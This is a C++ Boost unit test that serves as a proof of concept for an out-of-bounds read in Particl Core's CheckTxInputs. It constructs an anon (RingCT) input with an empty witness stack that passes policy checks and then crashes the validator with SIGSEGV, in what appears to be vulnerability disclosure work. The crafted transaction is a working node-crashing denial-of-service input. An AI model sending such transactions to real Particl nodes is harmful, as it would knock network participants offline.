// Proof of concept — Out-of-bounds read on an unchecked anon-input witness stack
// in Consensus::CheckTxInputs (Particl Core, src/consensus/tx_verify.cpp:238-239).
//
// Target: particl/particl-core, master (27.99.1.0)
// Class:  CWE-125 (out-of-bounds read) / CWE-20 (improper input validation) -> SIGSEGV DoS
//
// This is a BOOST unit test. Drop the BOOST_AUTO_TEST_CASE below into
//   src/test/particlchain_tests.cpp
// (inside the existing particlchain_tests suite) and build the test binary:
//   cmake --build build --target test_particl        # or: make -j check
//   ./build/src/test/test_particl \
//       --run_test=particlchain_tests/anon_input_missing_witness_stack_crashes_checktxinputs \
//       --catch_system_errors=no
//
// The test builds a Particl transaction with one anon (RingCT) input that carries a
// valid 33-byte scriptData.stack[0] but an EMPTY scriptWitness.stack, round-trips it
// through the wire format, confirms IsStandardTx / IsWitnessStandard both accept it,
// then calls CheckTxInputs in a forked child so the SIGSEGV is observed and contained
// without taking down the test runner. On an unpatched tree the child is killed by
// SIGSEGV; with the suggested guard applied, CheckTxInputs returns a clean rejection
// (bad-anonin-wstack-size) and the test's crash assertion no longer holds.
//
// Required headers already pulled in by particlchain_tests.cpp plus, for the fork path:
//   #include <sys/wait.h>
//   #include <unistd.h>
//   #include <csignal>

BOOST_AUTO_TEST_CASE(anon_input_missing_witness_stack_crashes_checktxinputs)
{
#ifdef WIN32
    BOOST_TEST_MESSAGE("Skipping POSIX crash repro on Windows.");
#else
    CMutableTransaction txn;
    txn.version = PARTICL_TXN_VERSION;

    CTxIn ai;
    ai.prevout.n = COutPoint::ANON_MARKER;
    ai.SetAnonInfo(1, 1);                       // nInputs=1, nRingSize=1
    ai.scriptData.stack.emplace_back(33, 0);    // valid 33-byte key-image blob -> passes bad-anonin-dstack-size
    txn.vin.push_back(ai);                        // scriptWitness.stack left EMPTY

    CAmount zero_fee = 0;
    OUTPUT_PTR<CTxOutData> out_fee = MAKE_OUTPUT<CTxOutData>();
    out_fee->SetCTFee(zero_fee);
    txn.vpout.push_back(out_fee);

    CKey k;
    InsecureNewKey(k, true);
    CScript script_pubkey = CScript() << OP_DUP << OP_HASH160 << ToByteVector(k.GetPubKey().GetID()) << OP_EQUALVERIFY << OP_CHECKSIG;
    txn.vpout.push_back(MAKE_OUTPUT<CTxOutStandard>(1 * COIN, script_pubkey));

    // Round-trip through the wire format the way a peer would deliver it.
    DataStream ss{};
    ss << TX_WITH_WITNESS(txn);
    CMutableTransaction decoded;
    ss >> TX_WITH_WITNESS(decoded);

    BOOST_REQUIRE_EQUAL(decoded.vin.size(), 1U);
    BOOST_REQUIRE(decoded.vin[0].IsAnonInput());
    BOOST_REQUIRE_EQUAL(decoded.vin[0].scriptData.stack.size(), 1U);
    BOOST_REQUIRE(decoded.vin[0].scriptWitness.stack.empty());   // the malformed condition survives deserialization

    const CTransaction tx_standard(decoded);
    std::string reason;
    // Nothing on the pre-CheckTxInputs path rejects it:
    BOOST_REQUIRE_MESSAGE(IsStandardTx(tx_standard, std::nullopt, true, CFeeRate(3000), reason, GetTime()), reason);
    CCoinsView viewDummyForPolicy;
    CCoinsViewCache inputsForPolicy(&viewDummyForPolicy);
    BOOST_REQUIRE(IsWitnessStandard(tx_standard, inputsForPolicy));

    pid_t pid = fork();
    BOOST_REQUIRE(pid >= 0);
    if (pid == 0) {
        TxValidationState state;
        state.SetStateInfo(GetTime(), 1, Params().GetConsensus(), true, false);
        if (!CheckTransaction(tx_standard, state)) {
            _exit(10);   // would mean CheckTransaction rejected it (it does not)
        }
        CCoinsView viewDummy;
        CCoinsViewCache inputs(&viewDummy);
        CAmount txfee = 0;
        (void)Consensus::CheckTxInputs(tx_standard, state, inputs, 1, txfee);
        _exit(11);       // would mean CheckTxInputs returned normally (it does not)
    }

    int status = 0;
    BOOST_REQUIRE_EQUAL(waitpid(pid, &status, 0), pid);
    BOOST_REQUIRE_MESSAGE(WIFSIGNALED(status),
        "CheckTxInputs returned instead of crashing; child exit status " << WEXITSTATUS(status));
    BOOST_TEST_MESSAGE("CheckTxInputs child terminated with signal " << WTERMSIG(status));
    BOOST_CHECK_EQUAL(WTERMSIG(status), SIGSEGV);
#endif
}
